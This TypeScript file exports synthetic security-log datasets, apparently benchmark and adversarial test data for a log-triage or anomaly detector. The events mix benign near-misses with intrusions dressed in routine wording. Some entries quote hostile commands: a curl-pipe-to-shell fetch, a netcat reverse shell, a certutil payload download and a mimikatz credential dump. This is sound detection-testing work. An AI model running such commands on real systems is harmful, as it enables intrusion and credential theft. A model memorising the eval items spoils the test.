export const sampleDatasets: Record<string, unknown[]> = {
  "adversarial_suite.jsonl": [
    {
      "source_type": "systemd",
      "hostname": "web-prod-01",
      "event_type": "service_restart",
      "message": "nginx.service restarted during scheduled maintenance window",
      "severity": 4.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "apt",
      "hostname": "web-prod-01",
      "event_type": "package_update",
      "message": "unattended-upgrades installed openssl during scheduled maintenance window",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "firewall_change",
      "message": "during scheduled maintenance window, opened RDP 3389 to 0.0.0.0/0",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "data_upload",
      "message": "nightly backup uploaded 6GB to 185.220.101.7:9001 (unknown destination) during backups window",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "185.220.101.7"
      }
    },
    {
      "source_type": "apt",
      "hostname": "web-prod-01",
      "event_type": "package_update",
      "message": "security updates for openssl and curl installed on patch Tuesday",
      "severity": 3.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "aide",
      "hostname": "web-prod-01",
      "event_type": "file_integrity",
      "message": "openssl library hash changed on patch Tuesday; package manager confirms update",
      "severity": 5.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "aide",
      "hostname": "web-prod-01",
      "event_type": "file_integrity",
      "message": "/usr/sbin/sshd binary changed on patch Tuesday; package manager reports NO update, hash matches known backdoor",
      "severity": 7.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "ids",
      "hostname": "web-prod-01",
      "event_type": "port_scan",
      "message": "sequential port probes from 10.0.0.9 during scheduled vulnerability scan window",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "10.0.0.9"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "user_created",
      "message": "scanner service created new user 'scan_svc' with uid 0 during scheduled scan",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "uid": 0
      }
    },
    {
      "source_type": "auditd",
      "hostname": "build-01",
      "event_type": "process_burst",
      "message": "212 short-lived containers spawned in 10m by CI/CD pipeline",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "build-01",
      "event_type": "process_exec",
      "message": "CI/CD build step ran: bash -c 'curl -s http://45.83.20.11/x.sh | sh'",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "45.83.20.11"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "dev-laptop-42",
      "event_type": "cpu_spike",
      "message": "CPU 96% for 4m during local build in developer sandbox",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-42",
      "event_type": "user_created",
      "message": "developer sandbox created account 'svc_admin' added to sudo group, uid 0",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "uid": 0
      }
    },
    {
      "source_type": "rsync",
      "hostname": "nas-01",
      "event_type": "data_transfer",
      "message": "nightly sync replicated 40GB to nas-01 (known backup host) at 01:00",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "rsync",
      "hostname": "nas-01",
      "event_type": "data_upload",
      "message": "nightly sync uploaded 40GB to 91.219.236.4 (external, unknown destination) at 01:00",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "91.219.236.4"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "sustained high IO on db-prod-01 during scheduled database migration",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "security_group_change",
      "message": "database migration opened Postgres 5432 to 0.0.0.0/0 for 'remote migration tooling'",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "systemd",
      "hostname": "vpn-gw-01",
      "event_type": "service_restart",
      "message": "openvpn.service restarted during scheduled VPN maintenance",
      "severity": 3.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "vpn",
      "hostname": "vpn-gw-01",
      "event_type": "geo_impossible_travel",
      "message": "during VPN maintenance, login for maria from 203.0.113.50 (RU) 5min after office login (IN)",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "maria",
        "geo": "RU",
        "username": "maria"
      }
    },
    {
      "source_type": "cloudtrail",
      "hostname": "web-prod-01",
      "event_type": "instance_launch",
      "message": "autoscaling group launched 6 instances during traffic increase",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cloudtrail",
      "hostname": "web-prod-01",
      "event_type": "security_group_change",
      "message": "autoscaling launch modified security group to allow 0.0.0.0/0 on all ports",
      "severity": 7.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "process_exec",
      "message": "overnight job ran: reverse shell to 45.146.26.8 via bash -i",
      "severity": 6.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "45.146.26.8"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "cron_job",
      "message": "overnight cron ran /usr/local/bin/report.sh exit 0",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    }
  ],
  "benign_nearmiss.jsonl": [
    {
      "source_type": "cloudtrail",
      "hostname": "web-prod-01",
      "event_type": "security_group_change",
      "message": "web LB security group allows 0.0.0.0/0 on 443 and 80 (designed public baseline)",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cloudtrail",
      "hostname": "web-prod-01",
      "event_type": "security_group_change",
      "message": "added HTTPS 443 ingress from 0.0.0.0/0 for new public endpoint",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "jump-01",
      "event_type": "file_read",
      "message": "backup job read /etc/passwd as part of nightly user inventory",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "osquery",
      "hostname": "dc-01",
      "event_type": "query",
      "message": "osquery collected users table (reads /etc/passwd) for compliance",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-42",
      "event_type": "group_change",
      "message": "jenny added herself to the docker group on her sandbox laptop",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "okta",
      "hostname": "mail-01",
      "event_type": "role_grant",
      "message": "arjun granted read-only BillingViewer role via approved request",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "apt",
      "hostname": "api-prod-01",
      "event_type": "package_update",
      "message": "apt downloaded and installed nginx from the distro mirror",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "build-01",
      "event_type": "process_exec",
      "message": "CI ran ./gradlew build after checkout (local script, no network fetch)",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "aide",
      "hostname": "api-prod-01",
      "event_type": "file_integrity",
      "message": "libssl hash changed; apt confirms openssl 3.0.13 update installed",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "aide",
      "hostname": "web-prod-01",
      "event_type": "file_integrity",
      "message": "kernel vmlinuz hash changed; package manager confirms linux-image update",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "rsync",
      "hostname": "nas-01",
      "event_type": "data_transfer",
      "message": "nightly sync replicated 40GB to nas-01 (known backup host, 10.0.0.20)",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "dst": "10.0.0.20"
      }
    },
    {
      "source_type": "restic",
      "hostname": "nas-01",
      "event_type": "data_upload",
      "message": "backup uploaded 12GB to internal 192.168.1.50 storage",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "dst": "192.168.1.50"
      }
    },
    {
      "source_type": "windows",
      "hostname": "win-desk-07",
      "event_type": "process_4688",
      "message": "certutil.exe -hashfile installer.msi sha256 (checksum verify)",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "windows",
      "hostname": "dc-01",
      "event_type": "process_4688",
      "message": "powershell Get-Service | Where Status -eq Running (admin inventory)",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "windows",
      "hostname": "win-desk-07",
      "event_type": "process_4688",
      "message": "wmic os get caption for asset inventory script",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "npm",
      "hostname": "build-01",
      "event_type": "process_exec",
      "message": "npm ci installed 1,240 packages from registry.npmjs.org",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "pip",
      "hostname": "ci-runner-01",
      "event_type": "process_exec",
      "message": "pip install -r requirements.txt from pypi.org",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "rsync",
      "hostname": "nas-01",
      "event_type": "file_operation",
      "message": "restore job wrote 3,000 files back from backup to /srv/files",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "logrotate",
      "hostname": "web-prod-01",
      "event_type": "file_operation",
      "message": "logrotate renamed and compressed 40 log files",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "vpn",
      "hostname": "vpn-gw-01",
      "event_type": "login",
      "message": "login for maria from office IP (IN), same region as last login 3h ago",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "geo": "IN",
        "prev_geo": "IN",
        "gap_minutes": 180
      }
    },
    {
      "source_type": "okta",
      "hostname": "mail-01",
      "event_type": "login",
      "message": "sam logged in from home and office (both IN) 2h apart",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "geo": "IN",
        "prev_geo": "IN",
        "gap_minutes": 120
      }
    },
    {
      "source_type": "systemd",
      "hostname": "api-prod-01",
      "event_type": "service_restart",
      "message": "api.service restarted after deploy #5001",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cron",
      "hostname": "dev-laptop-42",
      "event_type": "cron_job",
      "message": "cron ran backup.sh exit 0",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "certbot",
      "hostname": "web-prod-01",
      "event_type": "cert_renewal",
      "message": "TLS cert renewed for example.com",
      "severity": 1.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "k8s",
      "hostname": "ci-runner-01",
      "event_type": "process_burst",
      "message": "180 short-lived pods created by CI namespace",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    }
  ],
  "eval_set.jsonl": [
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "reverse_shell",
      "message": "postgres user spawned: nc -e /bin/sh 45.83.20.11 4444",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "postgres",
        "dst_ip": "45.83.20.11",
        "username": "postgres"
      }
    },
    {
      "source_type": "edr",
      "hostname": "dc-01",
      "event_type": "credential_dump",
      "message": "mimikatz.exe executed with sekurlsa::logonpasswords argument",
      "severity": 8.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "SYSTEM",
        "username": "SYSTEM"
      }
    },
    {
      "source_type": "edr",
      "hostname": "file-srv-01",
      "event_type": "mass_file_op",
      "message": "14,200 files renamed with .locked extension in 90 seconds under /shares/finance",
      "severity": 9.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "count": 14200
      }
    },
    {
      "source_type": "cloudtrail",
      "hostname": "aws-acct-prod",
      "event_type": "iam_policy_change",
      "message": "IAM user svc-reporting attached policy AdministratorAccess to itself from IP 91.203.5.12 (outside corporate VPN ranges)",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "svc-reporting",
        "src_ip": "91.203.5.12",
        "username": "svc-reporting"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "process_exec",
      "message": "www-data executed: certutil -urlcache -f http://update-cdn-mirror.net/patch.exe payload.exe",
      "severity": 6.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "www-data",
        "username": "www-data"
      }
    },
    {
      "source_type": "cloudtrail",
      "hostname": "aws-acct-prod",
      "event_type": "data_access",
      "message": "service account svc-analytics authenticated from a new ASN it has never used, then exported the full customers table to a presigned S3 URL within 2 minutes",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "svc-analytics",
        "table": "customers",
        "username": "svc-analytics"
      }
    },
    {
      "source_type": "dns",
      "hostname": "db-prod-01",
      "event_type": "dns_query_burst",
      "message": "412 TXT record queries to a single subdomain of freshly-registered domain qz9x1-cdn.net over 6 minutes",
      "severity": 4.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "domain": "qz9x1-cdn.net",
        "count": 412
      }
    },
    {
      "source_type": "edr",
      "hostname": "dev-laptop-17",
      "event_type": "process_exec",
      "message": "winword.exe spawned powershell.exe with an encoded command argument, three seconds after the user opened Invoice_2847.docm from email",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "priya",
        "parent": "winword.exe",
        "username": "priya"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "ssh_key_added",
      "message": "new key added to /root/.ssh/authorized_keys from 103.41.20.9, an IP outside the documented on-call VPN range",
      "severity": 6.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "root",
        "src_ip": "103.41.20.9",
        "username": "root"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "user_created",
      "message": "vendor-diagnostics account created a second account 'svc-backup2' with sudo NOPASSWD and hid it from the login banner",
      "severity": 6.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "vendor-diagnostics",
        "username": "vendor-diagnostics"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "firewall_change",
      "message": "backup service account modified iptables to allow inbound RDP (3389) from 0.0.0.0/0 during the nightly backup window",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "svc-backup",
        "port": 3389,
        "username": "svc-backup"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "data_upload",
      "message": "user in the finance group uploaded a backup archive to an external host, outside the finance backup laptop's usual nightly destination",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "finance-svc",
        "username": "finance-svc"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "disk IO spike to 9100 IOPS on /var/lib/postgresql at 02:14",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 9100
      }
    },
    {
      "source_type": "auditd",
      "hostname": "ci-runner-01",
      "event_type": "process_burst",
      "message": "187 short-lived build containers spawned and torn down in 8 minutes",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "count": 187
      }
    },
    {
      "source_type": "systemd",
      "hostname": "web-prod-01",
      "event_type": "service_restart",
      "message": "nginx restarted automatically after certbot renewed the TLS certificate",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "service": "nginx"
      }
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_failure_burst",
      "message": "63 failed logins from 198.51.100.44 over 10 minutes, all against decommissioned test accounts, no successful login",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "198.51.100.44"
      }
    },
    {
      "source_type": "edr",
      "hostname": "dev-laptop-42",
      "event_type": "resource_spike",
      "message": "CPU pegged at 100% and heavy outbound traffic to registry.npmjs.org for 6 minutes during a full dependency reinstall",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "host": "dev-laptop-42"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "dc-01",
      "event_type": "bulk_password_reset",
      "message": "15 employee accounts had passwords reset by IT admin jsmith between 09:00-09:20",
      "severity": 4.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "jsmith",
        "count": 15,
        "username": "jsmith"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "ci-runner-01",
      "event_type": "sudo_usage",
      "message": "deploy-bot invoked sudo systemctl restart app 41 times during a rolling deployment",
      "severity": 3.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "deploy-bot",
        "count": 41,
        "username": "deploy-bot"
      }
    },
    {
      "source_type": "monitoring",
      "hostname": "web-prod-01",
      "event_type": "service_restart",
      "message": "app service restarted twice during the scheduled patch window",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_failure",
      "message": "failed password for invalid user admin from 203.0.113.9",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "203.0.113.9",
        "user": "admin",
        "username": "admin"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-17",
      "event_type": "cron_failure",
      "message": "local cron job 'cleanup-tmp' failed 3 times in a row with permission denied",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "unknown-host-99",
      "event_type": "user_created",
      "message": "new user 'support_tmp' created with uid 0",
      "severity": 5.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "support_tmp",
        "uid": 0,
        "username": "support_tmp"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-42",
      "event_type": "priv_escalation",
      "message": "user jenny added to sudo group by process /tmp/.helper; new crontab entry installed immediately after",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "jenny",
        "binary": "/tmp/.helper",
        "username": "jenny"
      }
    }
  ],
  "events.jsonl": [
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 9200
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 8800
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 9500
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 9100
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 8700
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 9300
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 9000
      }
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_bruteforce",
      "message": "48 failed password attempts for root from 185.220.101.7 in 60s, then accepted password",
      "severity": 8.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "185.220.101.7",
        "user": "root",
        "username": "root"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "process_exec",
      "message": "postgres user executed: bash -c 'curl -s http://45.83.20.11/x.sh | sh'",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "postgres",
        "pid": 41822,
        "username": "postgres"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-42",
      "event_type": "priv_escalation",
      "message": "user jenny added to sudo group by process /tmp/.helper; new crontab entry installed",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "jenny",
        "binary": "/tmp/.helper",
        "username": "jenny"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "unknown-host-99",
      "event_type": "user_created",
      "message": "new user 'support_tmp' created with uid 0",
      "severity": 5.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "support_tmp",
        "uid": 0,
        "username": "support_tmp"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "ci-runner-01",
      "event_type": "process_burst",
      "message": "212 short-lived containers spawned in 10m by runner process churn",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "count": 212
      }
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_failure",
      "message": "failed password for invalid user admin from 203.0.113.9",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "203.0.113.9",
        "user": "admin",
        "username": "admin"
      }
    },
    {
      "source_type": "nginx",
      "hostname": "web-prod-01",
      "event_type": "request_flood",
      "message": "94,000 req/s sustained for 4m from 2,100 distinct IPs against /api/login, upstream latency p99 12s, 502 rate 61%",
      "severity": 8.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "rps": 94000,
        "distinct_ips": 2100,
        "path": "/api/login"
      }
    },
    {
      "source_type": "kernel",
      "hostname": "web-prod-01",
      "event_type": "syn_flood",
      "message": "possible SYN flooding on port 443, 48,000 half-open connections, SYN cookies engaged",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "port": 443,
        "half_open": 48000
      }
    },
    {
      "source_type": "nginx",
      "hostname": "dev-laptop-42",
      "event_type": "conn_exhaustion",
      "message": "worker_connections exhausted: 4,096 connections held open with incomplete headers from 40 IPs",
      "severity": 5.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "connections": 4096,
        "distinct_ips": 40
      }
    },
    {
      "source_type": "nginx",
      "hostname": "web-prod-01",
      "event_type": "traffic_spike",
      "message": "traffic spike to 9,000 req/s during product launch campaign window, error rate normal at 0.2%",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "rps": 9000,
        "error_rate": 0.002
      }
    },
    {
      "source_type": "vpn",
      "hostname": "vpn-gw-01",
      "event_type": "geo_impossible_travel",
      "message": "successful VPN login for user maria from 203.0.113.50 (geo: RU) 6 minutes after login from office IP 49.207.1.9 (geo: IN) — impossible travel",
      "severity": 7.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "maria",
        "src_ip": "203.0.113.50",
        "geo": "RU",
        "prev_geo": "IN",
        "gap_minutes": 6,
        "username": "maria"
      }
    },
    {
      "source_type": "webapp",
      "hostname": "web-prod-01",
      "event_type": "geo_anomaly_login",
      "message": "admin panel login success for user devops from residential proxy 45.146.26.8 (geo: BR); user has only ever logged in from IN",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "devops",
        "src_ip": "45.146.26.8",
        "geo": "BR",
        "usual_geo": "IN",
        "username": "devops"
      }
    },
    {
      "source_type": "aide",
      "hostname": "db-prod-01",
      "event_type": "file_integrity",
      "message": "integrity check: /usr/sbin/sshd binary checksum changed outside patch window; package manager reports no update installed",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "path": "/usr/sbin/sshd"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "nas-01",
      "event_type": "mass_file_rename",
      "message": "3,400 files renamed with .lockd extension in 5m by process /tmp/updater on shared volume /srv/files",
      "severity": 5.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "count": 3400,
        "binary": "/tmp/updater"
      }
    },
    {
      "source_type": "smartd",
      "hostname": "ci-runner-01",
      "event_type": "disk_degradation",
      "message": "SMART: reallocated sector count rising on /dev/sda; fsck repaired orphaned inodes on /var",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "device": "/dev/sda"
      }
    }
  ],
  "model_gauntlet.jsonl": [
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "cron_change",
      "message": "new crontab entry for root: */5 * * * * /var/tmp/.cache/.update >/dev/null 2>&1, created outside any change window",
      "severity": 3.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "file_change",
      "message": "authorized_keys for user deploy appended with an additional key at 02:47; no matching change ticket",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "db-prod-01",
      "event_type": "login",
      "message": "first ssh session from ws-114 (engineering workstation) to db-prod-01 as svc-backup",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "10.0.4.114",
        "user": "svc-backup",
        "username": "svc-backup"
      }
    },
    {
      "source_type": "netflow",
      "hostname": "ws-114",
      "event_type": "netflow_anomaly",
      "message": "ws-114 connected to 212 internal hosts on ports 445 and 3389 within 9 minutes",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cloudtrail",
      "hostname": "api-prod-01",
      "event_type": "api_call",
      "message": "db snapshot rds:prod-final copied and shared with an external aws account id",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "idp",
      "hostname": "sso",
      "event_type": "auth_anomaly",
      "message": "17 mfa push prompts for finance user denied, 18th approved at 03:20, session established from new device",
      "severity": 3.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "service_change",
      "message": "auditd stopped and /var/log/audit truncated to zero bytes",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "netflow",
      "hostname": "ws-207",
      "event_type": "netflow_anomaly",
      "message": "workstation contacted the same low-reputation domain every 60 seconds for 14 hours, uniform 2.1KB requests",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "idp",
      "hostname": "ci-runner-01",
      "event_type": "auth_anomaly",
      "message": "ci bot oauth token minted on ci-runner-01 reused 4 minutes later from a different ASN",
      "severity": 3.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "process_exec",
      "message": "www-data created 1.8GB 7z archive of /var/www/uploads inside /dev/shm",
      "severity": 3.0,
